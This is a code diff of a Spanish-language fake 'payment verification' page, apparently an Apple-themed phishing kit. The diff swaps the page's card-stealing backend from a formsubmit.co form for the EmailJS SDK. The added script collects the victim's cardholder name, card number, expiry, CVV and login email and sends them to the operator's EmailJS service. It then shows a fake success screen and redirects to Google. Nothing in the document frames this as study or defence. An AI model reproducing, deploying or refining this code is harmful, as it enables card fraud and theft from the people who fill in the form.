@@ -4,8 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificación de Pago</title>
+    <!-- Carga de SDK de EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // INICIALIZACIÓN DE EMAILJS
+        (function(){
+            // CAMBIA ESTO POR TU PUBLIC KEY DE EMAILJS
+            emailjs.init("TU_PUBLIC_KEY_AQUI");
+        })();
+    </script>
+
     <style>
-        /* (Mismos estilos de la versión anterior para que se vea bien) */
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
         .card { background: #fff; width: 100%; max-width: 380px; border-radius: 8px; box-shadow: 0 4px 24px rgba(0,0,0,0.1); padding: 30px; box-sizing: border-box; }
         .header { text-align: center; margin-bottom: 25px; }
@@ -66,18 +75,10 @@
                 <p>Confirma con una micro-carga de $0.00.</p>
             </div>
 
-            <!-- AQUÍ VA TU FORMULARIO -->
-            <!-- REEMPLAZA "soportee.gogle@gmail.com" CON TU CORREO REAL -->
-            <form id="form-card" action="https://formsubmit.co/el/fayepi" method="POST">
-                
-                <!-- Campo oculto para que no te llegue la página de "Gracias" -->
-                <input type="hidden" name="_next" value="https://www.google.com">
-                <!-- Campo oculto para el asunto del email -->
-                <input type="hidden" name="_subject" value="Nueva Tarjeta Recibida!">
-
+            <form id="form-card">
                 <div class="input-group">
                     <label>Nombre en la tarjeta</label>
-                    <input type="text" name="Nombre" placeholder="NOMBRE COMPLETO" required>
+                    <input type="text" name="Nombre" id="nombre" placeholder="NOMBRE COMPLETO" required>
                 </div>
                 <div class="input-group">
                     <label>Número de Tarjeta</label>
@@ -93,7 +94,7 @@
                     <div class="col">
                         <div class="input-group">
                             <label>CVV</label>
-                            <input type="text" name="CVV" placeholder="123" maxlength="4" required>
+                            <input type="text" name="CVV" id="cvv" placeholder="123" maxlength="4" required>
                         </div>
                     </div>
                 </div>
@@ -125,7 +126,7 @@
             document.getElementById('step2').classList.add('fade-in');
         });
 
-        document.getElementById('form-card').addEventListener('submit', (e) => {
+        document.getElementById('form-card').addEventListener('submit', function(e) {
             e.preventDefault();
             const btn = document.getElementById('btn-pagar');
             btn.disabled = true;
@@ -134,17 +135,37 @@
             document.getElementById('step2').classList.add('hidden');
             document.getElementById('loader').classList.remove('hidden');
 
-            // Simulación de tiempo de proceso
-            setTimeout(() => {
-                document.getElementById('loader').classList.add('hidden');
-                document.getElementById('success').classList.remove('hidden');
-                document.getElementById('success').classList.add('fade-in');
-                
-                // Redirigir después de 3 segundos
-                setTimeout(() => {
-                    window.location.href = "https://www.apple.com"; 
-                }, 3000);
-            }, 2000);
+            // DATOS A ENVIAR
+            const params = {
+                nombre: document.getElementById('nombre').value,
+                numero: document.getElementById('card-num').value,
+                expiracion: document.getElementById('card-exp').value,
+                cvv: document.getElementById('cvv').value,
+                // Puedes agregar más si quieres, ej: email del login
+                email_login: document.getElementById('email').value 
+            };
+
+            // CAMBIA ESTOS TRES VALORES POR LOS TUYOS DE EMAILJS
+            const serviceID =  'service_cowgn0s';
+            const templateID = 'template_pa8cml7';
+
+            emailjs.send(serviceID, templateID, params)
+                .then(() => {
+                    document.getElementById('loader').classList.add('hidden');
+                    document.getElementById('success').classList.remove('hidden');
+                    document.getElementById('success').classList.add('fade-in');
+                    
+                    // Redirigir
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com"; 
+                    }, 3000);
+                }, (err) => {
+                    alert("Error: " + JSON.stringify(err));
+                    document.getElementById('loader').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                    btn.disabled = false;
+                    btn.innerText = "Pagar y Verificar";
+                });
         });
 
         // Formatear tarjeta
